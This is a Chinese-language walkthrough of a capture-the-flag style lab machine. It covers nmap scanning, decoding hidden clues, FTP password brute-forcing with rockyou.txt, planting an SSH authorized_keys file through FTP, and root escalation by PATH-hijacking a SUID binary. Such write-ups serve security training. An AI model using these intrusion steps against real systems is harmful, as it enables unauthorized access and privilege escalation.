#### 信息收集

1. 主机发现：nmap -sn -PE -n 192.168.1.0/24
   192.168.1.130是新增加的ip地址，为靶机
2. 端口扫描：nmap -sT --min-rate 10000 -p- 192.168.1.130
   PORT   STATE SERVICE
   21/tcp open  ftp
   22/tcp open  ssh
   80/tcp open  http
3. 获取详细信息以及操作系统版本： nmap -sT -sV --min-rate 10000 -p21,22,80 -O 192.168.1.130
   PORT   STATE SERVICE VERSION
   21/tcp open  ftp     ProFTPD
   22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
   80/tcp open  http    Apache httpd 2.4.38 ((Debian))
   OS details: Linux 4.15 - 5.6
   Network Distance: 1 hop
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
4. 目录爆破，同时查看80端口

#### Web渗透

1. 非常简单的一个页面，查看源代码，发现base64一段编码，逐步解码后：

   ```
   Z28gYmFjayBpbnRydWRlciEhISBkR2xuYUhRZ2MyVmpkWEpwZEhrZ1pISnBjSEJwYmlCaFUwSnZZak5DYkVsSWJIWmtVMlI1V2xOQ2FHSnBRbXhpV0VKellqTnNiRnBUUWsxTmJYZ3dWMjAxVjJGdFJYbGlTRlpoVFdwR2IxZHJUVEZOUjFaSlZWUXdQUT09
   go back intruder!!! dGlnaHQgc2VjdXJpdHkgZHJpcHBpbiBhU0JvYjNCbElIbHZkU2R5WlNCaGJpQmxiWEJzYjNsbFpTQk1NbXgwV201V2FtRXliSFZhTWpGb1drTTFNR1ZJVVQwPQ==
   tight security drippin aSBob3BlIHlvdSdyZSBhbiBlbXBsb3llZSBMMmx0Wm5WamEybHVaMjFoWkM1MGVIUT0=
   i hope you're an employee L2ltZnVja2luZ21hZC50eHQ=
   /imfuckingmad.txt
   ```
2. 访问/imfuckingmad.txt文件，得到brainfuck代码，解密：

   ```
   man we are a tech company and still getting hacked??? what the shit??? enough is enough!!! 
   #
   ##


   /iTiS3Cr3TbiTCh.png
   ```
3. 访问/iTiS3Cr3TbiTCh.png，一张二维码，扫描后得到网站https://i.imgur.com/a4JjS76.png，无法访问，从别人的wp拿到后访问，得到用户名列表

#### 登录FTP

1. 将用户名列表做成字典，同时使用密码字典rockyou.txt进行ssh和ftp爆破
2. ssh无果，ftp爆出了用户名和密码：
   `[21][ftp] host: 192.168.1.130   login: luther   password: mypics`
   登陆后查看sync_log，无可利用信息，
3. 查看另一个目录hubert，无内容，是一个用户的家目录，尝试上传公钥ssh登录

#### FTP上传公钥

1. 生成公私钥，ssh-keygen -b 2048 -t rsa
2. 将私钥赋予400权限，chmod 400 id_rsa
3. 为hubert用户创建.ssh目录
4. 将公钥重命名为authorized_keys，上传到服务器的/hubert/.ssh下：put /root/.ssh/authorized_keys /hubert/.ssh/authorized_keys
5. ssh登录，拿到初级权限：ssh hubert@192.168.1.130 -i id_rsa

#### Suid提权

1. 先找到用户flag：flag 1/2
2. 查找具有suid权限的文件：find / -user root -perm -u=s 2>/dev/null
   /user/bin/getinfo 不是常见的命令
3. 查看此命令，有很多熟悉的字段，cat，ip等，可以将/tmp/加到环境变量前，写一个新的ip文命令或cat命令到tmp目录下：
   echo 'bin/bash' > /tmp/ip
4. 执行getinfo，获取root权限

```
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!

```
